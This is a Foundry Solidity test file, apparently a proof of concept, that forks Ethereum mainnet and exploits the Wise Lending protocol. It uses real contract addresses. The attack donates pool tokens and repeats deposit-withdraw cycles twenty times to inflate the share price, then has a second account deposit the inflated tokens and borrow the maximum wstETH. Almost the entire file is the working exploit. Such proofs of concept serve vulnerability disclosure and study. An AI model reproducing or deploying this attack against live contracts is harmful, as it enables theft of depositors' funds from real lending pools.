// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./IWiseLending.sol";
import "./IPositionNFTs.sol";
import "./IPendlePowerFarmToken.sol";
import "./IWiseSecurity.sol";
import "./IWstETHOracle.sol";
import "./IWstETH.sol";

IWiseLending constant wiseLending = IWiseLending(
    payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4)
);
IPositionNFTs constant nft = IPositionNFTs(
    0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61
);
// PLP-stETH-Dec2025
IPendlePowerFarmToken constant poolToken = IPendlePowerFarmToken(
    0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f
);

IERC20 constant pendleLPT = IERC20(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2);

IWstETH constant wsteth = IWstETH(
    payable(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0)
);

IWstETHOracle constant wstethOracle = IWstETHOracle(
    0x9aB8A49677a20fc0cC694479DF4462a82B4Cc1C4
);

IWiseSecurity constant wiseSecurity = IWiseSecurity(
    0x829c3AE2e82760eCEaD0F384918a650F8a31Ba18
);

contract WiseLendingTest is Test {
    address other = vm.addr(123_123);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_983_652);

        vm.label(address(wiseLending), "wiseLending");
        vm.label(address(poolToken), "poolToken");
        vm.label(address(pendleLPT), "pendleLPT");
        vm.label(address(other), "other");
        vm.label(address(wsteth), "wsteth");
        vm.label(address(wstethOracle), "wstethOracle");
        vm.label(address(wiseSecurity), "wiseSecurity");

        deal(address(pendleLPT), address(this), 1 ether);
    }

    function test_poc() public {
        pendleLPT.approve(address(poolToken), type(uint256).max);
        poolToken.approve(address(wiseLending), type(uint256).max);

        poolToken.depositExactAmount(1 ether);
        uint256 nftId = nft.mintPosition();

        wiseLending.depositExactAmount(nftId, address(poolToken), 1e9);

        poolToken.transfer(address(wiseLending), 1e9);

        (uint256 pseudoTotalPool, uint256 totalDepositShares, ) = wiseLending
            .lendingPoolData(address(poolToken));

        skip(5 seconds);

        uint256 share = wiseLending.getPositionLendingShares(
            nftId,
            address(poolToken)
        );

        // withdraw all shares
        wiseLending.withdrawExactShares(nftId, address(poolToken), share);

        uint256 i = 0;
        do {
            (pseudoTotalPool, totalDepositShares, ) = wiseLending
                .lendingPoolData(address(poolToken));
            share = wiseLending.depositExactAmount(
                nftId,
                address(poolToken),
                pseudoTotalPool * 2 - 1
            );

            wiseLending.withdrawExactAmount(nftId, address(poolToken), share);
            ++i;
        } while (i < 20);

        (pseudoTotalPool, totalDepositShares, ) = wiseLending.lendingPoolData(
            address(poolToken)
        );
        share = wiseLending.depositExactAmount(
            nftId,
            address(poolToken),
            pseudoTotalPool * 2 - 1
        );
        (pseudoTotalPool, totalDepositShares, ) = wiseLending.lendingPoolData(
            address(poolToken)
        );

        poolToken.transfer(other, poolToken.balanceOf(address(this)));

        vm.startPrank(other);

        poolToken.approve(address(wiseLending), type(uint256).max);

        nftId = nft.mintPosition();
        wiseLending.depositExactAmount(
            nftId,
            address(poolToken),
            poolToken.balanceOf(other)
        );
        uint256 amount = wiseSecurity.maximumBorrowToken(
            nftId,
            address(poolToken),
            0
        );
        wiseLending.borrowExactAmount(nftId, address(wsteth), amount);
    }

    function _simulateOracleCall() internal {
        (
            uint80 roundId,
            int256 answer,
            uint256 startedAt,
            uint256 updatedAt,
            uint80 answeredInRound
        ) = wstethOracle.latestRoundData();
        vm.mockCall(
            address(wstethOracle),
            abi.encodeCall(wstethOracle.latestRoundData, ()),
            abi.encode(
                roundId,
                answer,
                block.timestamp,
                block.timestamp,
                answeredInRound
            )
        );

        uint80 _roundId;
        (_roundId, answer, startedAt, updatedAt, answeredInRound) = wstethOracle
            .getRoundData(roundId);

        vm.mockCall(
            address(wstethOracle),
            abi.encodeCall(wstethOracle.getRoundData, (roundId)),
            abi.encode(
                _roundId,
                answer,
                block.timestamp,
                block.timestamp,
                answeredInRound
            )
        );
    }
}
